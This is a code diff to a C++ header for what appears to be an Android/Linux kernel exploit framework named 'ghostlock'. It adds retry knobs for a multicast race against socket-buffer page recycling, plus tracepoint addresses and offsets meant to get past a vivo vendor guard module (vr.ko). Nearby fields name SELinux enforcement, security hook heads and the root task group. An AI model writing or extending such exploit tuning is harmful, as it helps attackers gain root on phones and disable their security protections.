@@ -27,6 +27,12 @@ namespace ghostlock::profile {
         uint32_t w3_chain_rounds, w3_attempts, w3_settle_us;
         uint32_t tcp_attempts, tcp_arm_sequence;
         uint32_t tcp_post_receive_hold_iterations;
+        /* Multicast lottery knobs. Each setsockopt/sigret punch is one draw:
+         * the guest copy races skb page recycling, so a single shot misses
+         * often. attempts = how many draws; arm_sequence = draws per arming
+         * round; arm_hold = scheduling yields between rounds (lets the
+         * consumer thread settle before the next arming). */
+        uint32_t mcast_attempts, mcast_arm_sequence, mcast_arm_hold;
         uint32_t select_enter_delay_us, select_timeout_us;
         uint32_t select_consumer_max_calls, select_consumer_burst_calls;
         uint32_t handoff_pre_dispatch_settle_ms, handoff_module_poll_attempts;
@@ -106,6 +112,9 @@ namespace ghostlock::profile {
         uint64_t root_task_group = 0, selinux_enforcing = 0;
         uint64_t selinux_blob_sizes = 0, security_hook_heads = 0;
         uint64_t slide_nfulnl_logger = 0, slide_loggers_0_1 = 0, slide_boot_id = 0;
+        /* __tracepoint_sys_exit, image address. Present only on kernels whose
+         * vendor module guards sys_exit (vivo vr.ko); 0 = not provided. */
+        uint64_t vr_sys_exit_tp = 0;
     };
 
     struct KernelMisc {
@@ -118,6 +127,9 @@ namespace ghostlock::profile {
         std::optional<uint8_t> compact_waiter;
         std::optional<uint32_t> kernelsnitch_collisions;
         std::optional<uint32_t> mm_struct_sz;
+        /* offsetof(struct tracepoint, funcs): 0x40 before 6.6, 0x48 after
+         * (probestub was inserted ahead of it). Absent = no vr.ko guard. */
+        std::optional<uint32_t> vr_tracepoint_funcs;
     };
 
     struct RouteGeometry {
@@ -255,6 +267,14 @@ namespace ghostlock::profile {
         GHOSTLOCK_EXEC_U32(tcp_attempts)
         GHOSTLOCK_EXEC_U32(tcp_arm_sequence)
         GHOSTLOCK_EXEC_U32(tcp_post_receive_hold_iterations)
+        /* Absent knobs degrade to the historical one-shot behaviour. */
+        [[nodiscard]] uint32_t mcast_attempts() const noexcept {
+            return or_default(values_.execution.mcast_attempts, 1);
+        }
+        GHOSTLOCK_EXEC_U32(mcast_arm_sequence)
+        [[nodiscard]] uint32_t mcast_arm_hold() const noexcept {
+            return or_default(values_.execution.mcast_arm_hold, 20000);
+        }
         GHOSTLOCK_EXEC_U32(select_enter_delay_us)
         GHOSTLOCK_EXEC_U32(select_timeout_us)
         GHOSTLOCK_EXEC_U32(select_consumer_max_calls)
